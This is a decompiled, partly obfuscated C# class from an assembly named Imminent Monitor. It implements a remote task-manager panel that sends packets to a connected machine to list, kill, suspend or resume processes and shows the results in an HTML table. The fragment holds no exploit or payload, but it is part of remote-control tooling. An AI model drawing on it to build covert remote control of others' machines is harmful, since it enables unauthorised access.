// Decompiled with JetBrains decompiler
// Type: UserControlTaskManager
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlTaskManager : UserControl
{
  private IContainer icontainer_0;
  private ImageList imageList_0;
  private ImageList imageList_1;
  private Image image_0;
  private string string_0;
  private bool bool_0;
  private GClass18 gclass18_0;

  public UserControlTaskManager()
  {
    this.image_0 = (Image) null;
    this.string_0 = string.Empty;
    this.bool_0 = true;
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (UserControlTaskManager));
    this.vmethod_1(new ImageList(this.icontainer_0));
    this.vmethod_3(new ImageList(this.icontainer_0));
    this.SuspendLayout();
    this.vmethod_0().ImageStream = (ImageListStreamer) componentResourceManager.GetObject("ImageListProcess.ImageStream");
    this.vmethod_0().TransparentColor = Color.Transparent;
    this.vmethod_0().Images.SetKeyName(0, "Default.png");
    this.vmethod_2().ImageStream = (ImageListStreamer) componentResourceManager.GetObject("ImageListPlaceHolder.ImageStream");
    this.vmethod_2().TransparentColor = Color.Transparent;
    this.vmethod_2().Images.SetKeyName(0, "exe.bmp");
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlTaskManager);
    this.Size = new Size(736, 483);
    this.ResumeLayout(false);
  }

  internal virtual ImageList vmethod_0() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(ImageList imageList_2) => this.imageList_0 = imageList_2;

  internal virtual ImageList vmethod_2() => this.imageList_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(ImageList imageList_2) => this.imageList_1 = imageList_2;

  public GClass18 method_0() => this.gclass18_0;

  public void method_1(GClass18 gclass18_1) => this.gclass18_0 = gclass18_1;

  public void method_2()
  {
    this.Invoke((Delegate) (() => Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), "showOverlay()")));
    object[] object_0 = new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Processes,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProcessHeaderPacket.Refresh
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_3(int int_0)
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Processes,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProcessHeaderPacket.Kill,
      (object) int_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_4(int int_0)
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Processes,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProcessHeaderPacket.Suspend,
      (object) int_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_5(int int_0)
  {
    object[] object_0 = new object[3]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Processes,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ProcessHeaderPacket.ResumeProcess,
      (object) int_0
    };
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.method_0(), object_0);
  }

  public void method_6(object[] object_0)
  {
    try
    {
      if (this.bool_0)
      {
        this.image_0 = (Image) Class97.smethod_17((Bitmap) this.vmethod_2().Images[0]);
        this.string_0 = this.method_10(this.image_0, ImageFormat.Png);
        this.bool_0 = false;
      }
      string str1 = "pmAddRows('appTable', [";
      string str2 = "pmAddRows('backgroundTable', [";
      int num = object_0.Length - 1;
      for (int index = 2; index <= num; index += 7)
      {
        string str3 = Class97.smethod_21((string) object_0[index]);
        string str4 = Class97.smethod_21(Conversions.ToString(object_0[index + 1]));
        string str5 = Class97.smethod_21((string) object_0[index + 2]);
        string str6 = Class97.smethod_21((string) object_0[index + 3]);
        string str7 = Class97.smethod_21((string) object_0[index + 4]);
        string empty = string.Empty;
        string str8 = !(object_0[index + 5] is byte[]) ? this.string_0 : this.method_10((Image) Class97.smethod_17((Bitmap) Class97.smethod_18((byte[]) object_0[index + 5])), ImageFormat.Png);
        if ((bool) object_0[index + 6])
        {
          string str9 = string.Format("{{icon:'data:image/png;base64,{0}',name:'{1}',pid:'{2}',title:'{3}',path:'{4}',memory:'{5}'}},", (object) str8, (object) str3, (object) str4, (object) str5.Replace("\\", "\\\\"), (object) str6.Replace("\\", "\\\\"), (object) str7);
          str1 += str9;
        }
        else
        {
          string str10 = string.Format("{{icon:'data:image/png;base64,{0}',name:'{1}',pid:'{2}',title:'{3}',path:'{4}',memory:'{5}'}},", (object) str8, (object) str3, (object) str4, (object) str5.Replace("\\", "\\\\"), (object) str6.Replace("\\", "\\\\"), (object) str7);
          str2 += str10;
        }
      }
      string string_4_1 = str1.TrimEnd(',') + "])";
      string string_4_2 = str2.TrimEnd(',') + "])";
      Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), string_4_1);
      Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), string_4_2);
      Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), "hideOverlay()");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), "hideOverlay()");
      ProjectData.ClearProjectError();
    }
  }

  public void method_7(object[] object_0)
  {
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "appTable.removeRowByUniqueID(appTable.findRowByText({pid:'", object_0[2]), (object) "'}))")));
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "backgroundTable.removeRowByUniqueID(backgroundTable.findRowByText({pid:'", object_0[2]), (object) "'}))")));
  }

  public void method_8(object[] object_0)
  {
    Color blue = Color.Blue;
    string string_4_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "pmChangeRowColor('appTable', appTable.findRowByText({pid:'", object_0[2]), (object) "'}, undefined, true), 'rgba("), (object) blue.R), (object) ", "), (object) blue.G), (object) ", "), (object) blue.B), (object) ", 1.0)')"));
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), string_4_1);
    string string_4_2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "pmChangeRowColor('backgroundTable', backgroundTable.findRowByText({pid:'", object_0[2]), (object) "'}, undefined, true), 'rgba("), (object) blue.R), (object) ", "), (object) blue.G), (object) ", "), (object) blue.B), (object) ", 1.0)')"));
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), string_4_2);
  }

  public void method_9(object[] object_0)
  {
    string string_4_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "pmChangeRowColor('appTable', appTable.findRowByText({pid:'", object_0[2]), (object) "'}, undefined, true), 'rgba(117, 117 , 117, 1.0)')"));
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), string_4_1);
    string string_4_2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "pmChangeRowColor('backgroundTable', backgroundTable.findRowByText({pid:'", object_0[2]), (object) "'}, undefined, true), 'rgba(117, 117 , 117, 1.0)')"));
    Class97.smethod_20(this.method_0().method_20().newFormSystemManagers_0.vmethod_34(), string_4_2);
  }

  public string method_10(Image image_1, ImageFormat imageFormat_0)
  {
    using (MemoryStream memoryStream = new MemoryStream())
    {
      image_1.Save((Stream) memoryStream, imageFormat_0);
      return Convert.ToBase64String(memoryStream.ToArray());
    }
  }
}
